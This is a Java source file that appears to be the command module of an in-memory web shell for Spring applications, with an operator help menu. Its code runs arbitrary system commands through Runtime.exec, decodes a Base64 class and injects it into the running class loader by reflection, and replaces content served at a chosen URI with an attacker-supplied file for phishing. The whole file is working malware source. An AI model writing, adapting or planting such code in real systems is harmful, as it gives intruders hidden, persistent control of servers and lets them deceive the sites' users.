package com.stdout.springMem;

import java.io.*;
import java.lang.instrument.UnmodifiableClassException;
import java.lang.reflect.InvocationTargetException;

public class SpringMemModels {
    public static boolean isWantFish = false;
    public static String fishUri = "";
    public static String fishContent = "";

    // models
    public static String exec(String cmd) throws IOException {
        String result = "";
        if (cmd != null && cmd.length() > 0) {
            Process p = Runtime.getRuntime().exec(cmd);
            java.io.OutputStream os = p.getOutputStream();
            java.io.InputStream in = p.getInputStream();
            java.io.DataInputStream dis = new java.io.DataInputStream(in);

            for (String disr = dis.readLine(); disr != null; disr = dis.readLine()) {
                result = result + disr + "\n";
            }
        }
        return result;
    }

    public static Class defineClass(Thread thread) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        StringBuffer source = new StringBuffer();
        InputStream is = SpringMemTransformer.class.getClassLoader().getResourceAsStream("helloBase64.txt");
        InputStreamReader isr = new InputStreamReader(is);
        String line = null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                source.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();

        }

        java.util.Base64.Decoder decoder = java.util.Base64.getDecoder();
        byte[] d = decoder.decode(source.toString());
        ClassLoader contextClassLoader = thread.getContextClassLoader();

        java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[] {String.class, byte[].class, int.class, int.class});
        defineClass.setAccessible(true);
        Class define = (Class) defineClass.invoke(contextClassLoader, new Object[] {"org.vulhub.shirodemo.HelloController", d, 0, d.length});
        

        return define;
    }

    public static String exit() throws UnmodifiableClassException {
        return SpringMemShell.back();
    }

    public static String help() {
        String result = "";
        result += "models: \n";

        result += "\t 1. exec ==> execute system command\n";
        result += "\t\t param: cmd\n\n";

        result += "\t 2. exit ==> remove the SpringMemShell\n";
        result += "\t\t param: \n\n";

        result += "\t 3. fish_start ==> start static fish\n";
        result += "\t\t param: target file\n\n";

        result += "\t 4. fish_stop ==> stop static fish\n";
        result += "\t\t param: \n\n";

        result += "\t 5. fish_show ==> show the fish info\n";
        result += "\t\t param: \n\n";



        return result;
    }

    public static String StaticFish(String uri) {
        String result = "";
        if (isWantFish) {
            if (uri.equals(fishUri)) {
                result = fishContent;
            }
        }
        return result;
    }

    public static String fishStart(String target, String file) throws Exception {
        String result = "";
        isWantFish = true;
        fishContent = readFileContent(file);
        fishUri = target;
        result = "uri ==> \n\t" + target + "\ncontent ==> \n" + fishContent;
        return result;
    }

    public static String fishStop() {
        isWantFish = false;
        String result = "fish stopped!!";
        return result;
    }

    public static String fishShow() {
        String result = "";

        if (isWantFish) {
            result += "status ==> \n\t" + "started\n\n";
            result += "static path ==> \n\t" + fishUri + "\n\n";
            result += "content ==> \n" + fishContent + "\n\n";
        } else {
            result += "status ==> " + "stopped\n\n";
        }
        return result;
    }


    // utils
    public static String readFileContent(String file) throws Exception {
        String result = "";
        StringBuffer source = new StringBuffer();
        FileInputStream f = new FileInputStream(file);
        InputStreamReader isr = new InputStreamReader(f);
        String line = null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                source.append(line + "\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        result = source.toString();

        return result;
    }

    public static String readSource(String name) {
        String result = "";
        StringBuffer source = new StringBuffer();
        InputStream is = SpringMemTransformer.class.getClassLoader().getResourceAsStream(name);

        InputStreamReader isr = new InputStreamReader(is);
        String line = null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                source.append(line + "\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        result = source.toString();

        return result;
    }

}
